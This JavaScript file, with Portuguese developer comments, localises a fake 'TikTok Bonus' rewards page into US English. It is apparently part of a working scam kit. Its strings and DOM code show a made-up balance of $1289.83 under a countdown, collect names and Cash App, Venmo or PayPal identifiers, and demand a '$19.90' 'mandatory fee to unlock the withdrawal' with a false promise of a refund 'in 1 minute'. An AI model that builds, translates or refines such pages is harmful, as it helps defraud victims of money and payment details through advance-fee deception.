/* geo-i18n.js — auto locale + currency + withdraw method by IP (no manual selector) */
(function () {
  const COUNTRY_CONFIG = {
    // Agora forçamos o padrão Americano (en-US)
    BR: { locale: "pt-BR", currency: "EUR", withdraw: "PIX", withdrawMethods: ["PIX"] },
    US: { locale: "en-US", currency: "USD", withdraw: "CASHAPP", withdrawMethods: ["CASHAPP", "VENMO", "PAYPAL"] }
  };

  const I18N = {
    // Aqui estava o segredo: as strings em inglês estavam com Euro fixo. Troquei tudo para Dólar!
    "en-US": {
      "app.title": "TikTok Bonus",
      "balance.title": "Your balance",
      "balance.expire": "YOUR BALANCE EXPIRES IN",
      "balance.last_reward": "Last reward:",
      "action.withdraw": "Withdraw",
      "action.withdraw_money": "Withdraw money",
      "status.completed": "Completed",
      "status.unavailable": "Unavailable",
      "congrats.title": "Congratulations!",
      "congrats.subtitle": "You completed",
      "congrats.subtitle.nobreak": "all tasks",
      "checkin.text": "Check in for 14 days to earn",
      "checkin.completed": "You completed all check-in days.",
      "timer.expires_in": "Expires in",
      "title.redeem": "Redeem rewards",
      "task.ads": "Watch targeted ads daily to earn up to",
      "task.watch_videos": "Watch videos",
      "task.redeem_rewards": "Redeem your rewards and earn",
      "task.search_daily": "Do 60 searches daily to earn up to",
      "task.invite": "Invite 1 friend to sign up and earn",
      "hint.watch_10min": "Watch for 10 min",
      "hint.up_to_points": "Up to {n} points",
      "unit.points": "points",
      "unit.searches": "searches",
      "search.rule": "Get 21 points for typing a search in the search bar, or 0 points for tapping a suggested search, like \"You might like\".",
      "withdraw.add_method": "Add withdrawal method",
      "withdraw.rule": "To withdraw money, you need a minimum balance of {min}. Limits may vary by country or region.",
      "withdraw.method.pix": "Transfer",
      "withdraw.text": "Withdraw Money",
      "charge.text": "Mobile Recharge",
      "withdraw.method.pix_sub": "Instant receiving",
      "withdraw.method.bank": "Bank transfer",
      "withdraw.method.iban": "Bank transfer (IBAN)",
      "withdraw.method.uk": "Bank transfer (UK)",
      "withdraw.method.cashapp": "Cash App",
      "withdraw.method.cashapp_sub": "Instant Transfer · Cash App",
      "withdraw.method.venmo": "Venmo",
      "withdraw.method.venmo_sub": "Instant Transfer · Venmo",
      "withdraw.method.paypal": "PayPal",
      "withdraw.method.paypal_sub": "Instant Transfer · PayPal",
      "withdraw.link.pix": "Link contact",
      "withdraw.link.bank": "Link Bank Account",
      "withdraw.link.iban": "Link IBAN",
      "withdraw.link.uk": "Link UK account",
      "withdraw.link.paypal": "Link Bank Account",
      "form.name": "Name",
      "form.name_placeholder": "Full name",
      "form.pix_key_type": "Key type",
      "form.pix_key": "Transfer key",
      "form.iban": "IBAN",
      "form.sort_code": "Sort code",
      "form.account_number": "Account number",
      "form.document": "Document",
      "form.cashtag": "$Cashtag",
      "form.cashtag_placeholder": "$YourCashtag",
      "form.venmo_username": "Venmo Username",
      "form.venmo_placeholder": "@username or email",
      "form.paypal_email": "Email Address",
      "form.paypal_placeholder": "Enter your PayPal email",
      "form.submit": "Submit",
      "name.complete": "Full name",
      "live.title": "Get LIVE Coins",
      "live.desc": "Use coins to send virtual gifts to your favorite live hosts.",
      "mobile.topup": "Mobile top-up",
      "mobile.rule": "You need a minimum balance of {min} to top up your phone",
      "loading.validating": "Validating access...",
      "loading.steps.validating": "Validating data...",
      "loading.steps.connecting": "Connecting to server...",
      "loading.steps.finishing": "Finalizing withdrawal...",
      "loading.steps.almost": "Almost ready...",
      "popup.title": "Prize Goal",
      "popup.text": "Congratulations! As part of an exclusive rewards campaign.",
      "popup.expires": "Expires in",
      "popup.thanks": "Thank you",
      "timer.expired": "Expired",
      "loader.validating": "Validating your information",
      "loader.withdrawing": "Completing withdrawal",
      "loader.processing": "Processing transaction",
      "loader.finishing": "Finishing",
      "confirmation.balance_title": "AVAILABLE BALANCE",
      "confirmation.balance_subtitle": "Waiting for withdrawal confirmation",
      "confirmation.identity_title": "IDENTITY CONFIRMATION",
      "confirmation.refundable_badge": "REFUNDABLE AMOUNT",
      "confirmation.fee_part1": "Mandatory fee to unlock the withdrawal of",
      "confirmation.fee_part2": ". The amount of",
      "confirmation.fee_part3": "will be fully refunded to you in 1 minute.",
      "confirmation.refund_data_title": "REFUND DETAILS",
      "confirmation.receipt.name": "Name",
      "confirmation.receipt.date": "Date",
      "confirmation.receipt.pix_key": "Transfer key",
      "confirmation.receipt.amount": "Amount to receive",
      "confirmation.process_title": "RELEASE PROCESS",
      "confirmation.step1_title": "Pay confirmation fee",
      "confirmation.step1_desc": "$19.90 for identity verification",
      "confirmation.step2_title": "Receive automatic refund",
      "confirmation.step2_desc": "Amount returned in 1 minute",
      "confirmation.step3_title": "Access full balance",
      "confirmation.step3_desc": "$1289.83 released for withdrawal",
      "confirmation.cta": "Pay fee to unlock withdrawal",
      "confirmation.timer": "⏱️ Automatic refund in 1 minute",
      "confirmation.success": "✅ Identity confirmed. $19.90 refunded and withdrawal unlocked.",
      "confirmation.secure": "100% secure process",
      "confirmation.help": "Need help?"
    }
  };

  function tFactory(locale) {
    const fallback = I18N["en-US"];
    const dict = I18N[locale] || fallback;

    return function t(key, vars = {}) {
      let str = (dict && dict[key]) || (fallback && fallback[key]) || key;
      Object.keys(vars).forEach((k) => {
        str = str.replace(new RegExp("\\{" + k + "\\}", "g"), String(vars[k]));
      });
      return str;
    };
  }

  function formatMoney(value, currency, locale) {
    try {
      return new Intl.NumberFormat(locale || undefined, { style: "currency", currency }).format(value);
    } catch (e) {
      return "$" + (Math.round(value * 100) / 100).toFixed(2);
    }
  }

  function applyTextReplacements(t, locale) {
    const map = [
      ["#one .title", "app.title"],
      ["#three .title", "title.redeem"],
      [".saldo-text", "balance.title"],
      [".btn-sacar .btn-text", "action.withdraw"],
      [".btn-three-saque", "action.withdraw_money"],
      [".parabens-txtum", "congrats.title"],
      [".parabens-txtdois", "congrats.subtitle"],
      [".nobreak", "congrats.subtitle.nobreak"],
      [".btn-concluido-text", "status.completed"],
      [".btn-indis", "status.unavailable"],
      [".popup .gol", "popup.title"],
      [".popup .gol-txt", "popup.text"],
      [".popup .timer-label", "popup.expires"],
      [".popup .btn-txt-obrigado", "popup.thanks"],
      [".concluiu-txt", "checkin.completed"],
      ["#new-loading-text", "loading.validating"],
      [".saldo-coins-text", "live.title"],
      [".saldo-sacar-text", "withdraw.text"],
      [".saldo-recarga-text", "charge.text"],
      [".transferencia-txt-coins", "live.desc"],
      [".total-pontos .total-pontos-dois", "balance.last_reward"],
      ["#four .saque-title", "withdraw.add_method"],
      [".nome-completo", "name.complete"]
    ];

    map.forEach(([sel, key]) => {
      document.querySelectorAll(sel).forEach((el) => {
        if (!el || (el.children && el.children.length)) return;
        el.textContent = t(key);
      });
    });

    document.querySelectorAll(".parabens-txtdois").forEach((el) => {
      if (!el) return;
      for (const node of el.childNodes) {
        if (node.nodeType === Node.TEXT_NODE && node.textContent.trim()) {
          node.textContent = t("congrats.subtitle") + " ";
          break;
        }
      }
    });

    document.querySelectorAll(".timer-label").forEach((el) => {
      if (!el || el.closest(".popup")) return;
      el.textContent = t("timer.expires_in");
    });

    const countdown = document.querySelector("#countdown-text");
    if (countdown) {
      for (const node of countdown.childNodes) {
        if (node.nodeType === Node.TEXT_NODE && node.textContent.trim()) {
          node.textContent = " " + t("balance.expire") + " ";
          break;
        }
      }
    }

    document.querySelectorAll(".day-tracker__label").forEach((el) => {
      const raw = (el.textContent || "").trim();
      const m = raw.match(/^Dia\s+(\d+)/i);
      if (!m) return;
      el.textContent = `Day ${String(m[1]).padStart(2, "0")}`;
    });

    document.querySelectorAll(".step-text").forEach((el) => {
      const raw = (el.textContent || "").trim();
      let m = raw.match(/^(\d+)\s+pontos$/i);
      if (m) { el.textContent = `${m[1]} ${t("unit.points")}`; return; }
      m = raw.match(/^(\d+)\s+pesquisas$/i);
      if (m) { el.textContent = `${m[1]} ${t("unit.searches")}`; return; }
    });

    document.querySelectorAll(".assista-txt").forEach((el) => {
      const raw = (el.textContent || "").trim();
      if (/^Assista por 10 min/i.test(raw)) { el.textContent = t("hint.watch_10min"); return; }
      const m = raw.match(/^Até\s+(\d+)\s+pontos$/i);
      if (m) { el.textContent = t("hint.up_to_points", { n: m[1] }); return; }
    });

    document.querySelectorAll(".entre-txt").forEach((el) => {
      if (!el) return;
      const ownText = Array.from(el.childNodes)
        .filter(n => n.nodeType === Node.TEXT_NODE)
        .map(n => (n.textContent || "").trim()).join(" ").trim();
      if (!ownText) return;

      const replaceOwnText = (newText) => {
        el.childNodes.forEach(n => {
          if (n.nodeType === Node.TEXT_NODE && n.textContent.trim()) n.textContent = newText + " ";
        });
      };

      if (ownText.startsWith("Entre por 14 dias para ganhar")) return replaceOwnText(t("checkin.text"));
      if (ownText.startsWith("Vê anúncios direcionados diariamente")) return replaceOwnText(t("task.ads"));
      if (ownText.startsWith("Assistir vídeos")) return replaceOwnText(t("task.watch_videos"));
      if (ownText.startsWith("Resgate suas recompensas")) return replaceOwnText(t("task.redeem_rewards"));
      if (ownText.startsWith("Faça 60 pesquisas diárias")) return replaceOwnText(t("task.search_daily"));
      if (ownText.startsWith("Convide 1 amigo")) return replaceOwnText(t("task.invite"));
    });

    document.querySelectorAll(".obtem-txt").forEach((el) => {
      if (!el || (el.children && el.children.length)) return;
      const raw = (el.textContent || "").trim();
      const minWithdraw = "$1.50";
      const minMobile = "$10.00";
      const lastReward = "$646.43";

      if (raw.startsWith("Para sacar dinheiro,")) { el.textContent = t("withdraw.rule", { min: minWithdraw }); return; }
      if (raw.startsWith("Última recompensa:")) { el.textContent = t("balance.last_reward", { min: lastReward }); return; }
      if (raw.startsWith("Obtém 21 pontos")) { el.textContent = t("search.rule"); return; }
      if (raw.startsWith("Voce precisa de um saldo mínimo") || raw.startsWith("Você precisa de um saldo mínimo")) { el.textContent = t("mobile.rule", { min: minMobile }); return; }
    });

    const nineSectionTitles = document.querySelectorAll("#nine .confirmation-section-title");
    if (nineSectionTitles && nineSectionTitles.length) {
      const titleKeys = ["confirmation.identity_title", "confirmation.refund_data_title", "confirmation.process_title"];
      nineSectionTitles.forEach((el, i) => {
        if (!el || !titleKeys[i]) return;
        el.textContent = t(titleKeys[i]);
      });
    }

    const nineSimpleMap = [
      ["#nine .confirmation-balance-title", "confirmation.balance_title"],
      ["#nine .confirmation-balance-subtitle", "confirmation.balance_subtitle"],
      ["#nine .confirmation-reembolso-badge", "confirmation.refundable_badge"],
      ["#nine #confirmation-button", "confirmation.cta"],
      ["#nine .confirmation-timer", "confirmation.timer"],
      ["#nine #confirmation-success-message", "confirmation.success"],
      ["#nine .confirmation-footer-text", "confirmation.secure"],
      ["#nine .confirmation-footer-link", "confirmation.help"]
    ];
    nineSimpleMap.forEach(([sel, key]) => {
      document.querySelectorAll(sel).forEach((el) => {
        if (!el || (el.children && el.children.length)) return;
        el.textContent = t(key);
      });
    });

    const receiptLabels = document.querySelectorAll("#nine .confirmation-receipt-label");
    if (receiptLabels && receiptLabels.length) {
      const keys = ["confirmation.receipt.name", "confirmation.receipt.date", "confirmation.receipt.pix_key", "confirmation.receipt.amount"];
      receiptLabels.forEach((el, i) => {
        if (!el || !keys[i]) return;
        el.textContent = t(keys[i]);
      });
    }

    const stepTitles = document.querySelectorAll("#nine .confirmation-requirement-title");
    if (stepTitles && stepTitles.length) {
      const keys = ["confirmation.step1_title", "confirmation.step2_title", "confirmation.step3_title"];
      stepTitles.forEach((el, i) => {
        if (!el || !keys[i]) return;
        el.textContent = t(keys[i]);
      });
    }
    const stepDescs = document.querySelectorAll("#nine .confirmation-requirement-description");
    if (stepDescs && stepDescs.length) {
      const keys = ["confirmation.step1_desc", "confirmation.step2_desc", "confirmation.step3_desc"];
      stepDescs.forEach((el, i) => {
        if (!el || !keys[i]) return;
        el.textContent = t(keys[i]);
      });
    }

    const feeDesc = document.querySelector("#nine .confirmation-fee-description");
    if (feeDesc) {
      const parts = [t("confirmation.fee_part1") + " ", " " + t("confirmation.fee_part2") + " ", " " + t("confirmation.fee_part3")];
      let idx = 0;
      for (const node of feeDesc.childNodes) {
        if (node.nodeType === Node.TEXT_NODE && node.textContent.trim()) {
          node.textContent = parts[idx] || node.textContent;
          idx += 1;
        }
      }
    }
  }

  function adaptWithdrawUI(withdrawType, t) {
    const method = String(withdrawType || "CASHAPP").toUpperCase();
    const linkTitle = document.querySelector("#five .saque-title");
    const pixTypeSelector = document.querySelector("#pix-type-selector");
    const pixKeyInput = document.querySelector("#pix-key-input");
    const pixKeyWrapper = document.querySelector("#pix-key-wrapper");
    const keyTypeGroup = document.querySelector("#key-type-group");
    const keyLabel = document.querySelector("#key-field-label");
    const submitBtnText = document.querySelector("#btn-enviar-pix .btn-text");

    const hide = (el) => { if (el) el.style.display = "none"; };
    const setText = (el, txt) => { if (el) el.textContent = txt; };

    hide(keyTypeGroup);
    hide(pixTypeSelector);

    if (linkTitle) setText(linkTitle, t("withdraw.link.bank"));
    if (submitBtnText) setText(submitBtnText, t("form.submit"));

    if (pixKeyInput) {
      pixKeyInput.disabled = false;
      pixKeyInput.classList.remove("input-disabled");
      pixKeyInput.value = "";
      pixKeyInput.removeAttribute("inputmode");
    }
    if (pixKeyWrapper) pixKeyWrapper.classList.remove("input-wrapper-disabled");

    if (method === "VENMO") {
      if (keyLabel) setText(keyLabel, t("form.venmo_username"));
      if (pixKeyInput) {
        pixKeyInput.placeholder = t("form.venmo_placeholder");
        pixKeyInput.setAttribute("inputmode", "email");
        pixKeyInput.setAttribute("autocomplete", "username");
      }
    } else if (method === "PAYPAL") {
      if (keyLabel) setText(keyLabel, t("form.paypal_email"));
      if (pixKeyInput) {
        pixKeyInput.setAttribute("type", "text");
        pixKeyInput.placeholder = t("form.paypal_placeholder");
        pixKeyInput.setAttribute("inputmode", "email");
        pixKeyInput.setAttribute("autocomplete", "email");
      }
    } else {
      if (keyLabel) setText(keyLabel, t("form.cashtag"));
      if (pixKeyInput) {
        pixKeyInput.setAttribute("type", "text");
        pixKeyInput.placeholder = t("form.cashtag_placeholder");
        pixKeyInput.setAttribute("inputmode", "text");
        pixKeyInput.setAttribute("autocomplete", "off");
      }
    }

    document.querySelectorAll(".transferencia-txt").forEach((el) => {
      if (!el) return;
      if (method === "VENMO") el.textContent = t("withdraw.method.venmo");
      else if (method === "PAYPAL") el.textContent = t("withdraw.method.paypal");
      else el.textContent = t("withdraw.method.cashapp");
    });

    const submitBtn = document.getElementById("btn-enviar-pix");
    if (submitBtn) submitBtn.classList.add("btn-disabled");
  }

  function methodIconHtml(method) {
    if (method === "VENMO") {
      return `<img src="images/venmo-logo.png" alt="Venmo">`;
    }
    if (method === "PAYPAL") {
      return `<img src="images/paypal-logo.png" alt="PayPal">`;
    }
    return `<img src="images/cashapp-logo.png" alt="Cash App">`;
  }

  function renderWithdrawMethodOptions(withdrawMethods, t) {
    const container = document.querySelector("#four .saque-popup");
    const template = document.querySelector("#four .pix-item");
    if (!container || !template) return;

    Array.from(container.querySelectorAll(".pix-item")).slice(1).forEach((n) => n.remove());

    const setItem = (item, method) => {
      item.setAttribute("data-open-modal", "five");
      item.setAttribute("data-withdraw-method", method);
      item.classList.add("withdraw-method-item");

      const titleEl = item.querySelector(".pix-title");
      const subEl = item.querySelector(".pix-subtitle");
      const iconBox = item.querySelector(".pix-icon");

      if (method === "VENMO") {
        if (titleEl) titleEl.textContent = t("withdraw.method.venmo");
        if (subEl) subEl.textContent = t("withdraw.method.venmo_sub");
      } else if (method === "PAYPAL") {
        if (titleEl) titleEl.textContent = t("withdraw.method.paypal");
        if (subEl) subEl.textContent = t("withdraw.method.paypal_sub");
      } else {
        if (titleEl) titleEl.textContent = t("withdraw.method.cashapp");
        if (subEl) subEl.textContent = t("withdraw.method.cashapp_sub");
      }

      if (iconBox) iconBox.innerHTML = methodIconHtml(method);
    };

    const unique = Array.from(new Set(withdrawMethods || [])).filter(Boolean);
    if (!unique.length) return;

    setItem(template, unique[0]);
    for (let i = 1; i < unique.length; i++) {
      const clone = template.cloneNode(true);
      setItem(clone, unique[i]);
      container.appendChild(clone);
    }
  }

  async function init() {
    const country = "US";
    const conf = COUNTRY_CONFIG[country];

    const locale = conf.locale;
    const currency = conf.currency;
    const withdraw = conf.withdraw;
    const withdrawMethods = conf.withdrawMethods || [withdraw].filter(Boolean);

    const t = tFactory(locale);
    window.__APP = {
      country, locale, currency, withdraw, withdrawMethods, withdrawSelected: withdraw, t, rate: 1
    };

    try { document.documentElement.setAttribute("lang", locale); } catch (e) { }

    const onReady = async () => {
      applyTextReplacements(t, locale);
      renderWithdrawMethodOptions(withdrawMethods, t);

      window.__APP.setWithdrawMethod = (method) => {
        const m = method || window.__APP.withdraw || "CASHAPP";
        window.__APP.withdrawSelected = m;
        adaptWithdrawUI(m, t);
      };
      window.__APP.setWithdrawMethod(withdraw);

      // Comentei as regras abaixo porque o script delas criava conflito
      // direto com a nossa animação do index.html (elas matavam os números rodando)
      // applyCurrencyToAmountTargets({ currency, locale, rate: 1 });
    };

    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", onReady);
    } else {
      onReady();
    }
  }

  init();
})();